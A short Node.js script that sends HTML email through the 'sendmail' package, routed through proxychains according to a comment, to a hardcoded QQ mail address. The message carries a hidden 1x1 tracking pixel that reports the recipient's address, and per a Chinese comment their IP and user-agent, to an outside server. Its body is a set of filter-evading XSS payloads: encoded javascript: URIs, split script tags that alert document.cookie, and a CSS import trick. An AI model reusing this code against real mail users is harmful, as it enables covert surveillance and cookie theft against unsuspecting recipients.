#!/usr/bin/env node
// /usr/local/Cellar/proxychains-ng/4.12_1/bin/proxychains4  -f tmp/proxychains.conf node tools/sendmail.js
const sendmail = require('sendmail')();
function fnMySendMail(s,t,b)
{
	sendmail({
	    from: 'love2000@sougou.com',
	    // from: s,
	    to: s,
	    subject: t,
	    // 邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
	    html: b+"<img height=1 width=1 src='https://162.219.126.11:8080/?k=" + s + "'>"
	    /*
	    ,attachments:[
	    {
	    	filename: '图',
      		content: require('fs').readFileSync('file.png')
	    }]
	    //////*/
	  }, function(err, reply) {
	    console.log(err && err.stack);
	    console.dir(reply);
	});
}

fnMySendMail("3135773@qq.com",'标xx题','内容...<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><IMG SRC="jav&#x09;ascript:alert(\'XSS\');"><IMG SRC="jav	ascript:alert(\'XSS\');"><INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"><scr'+'ipt>alert("OK" + document.cookie)</sc'+'ript><STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>.愿你安好');
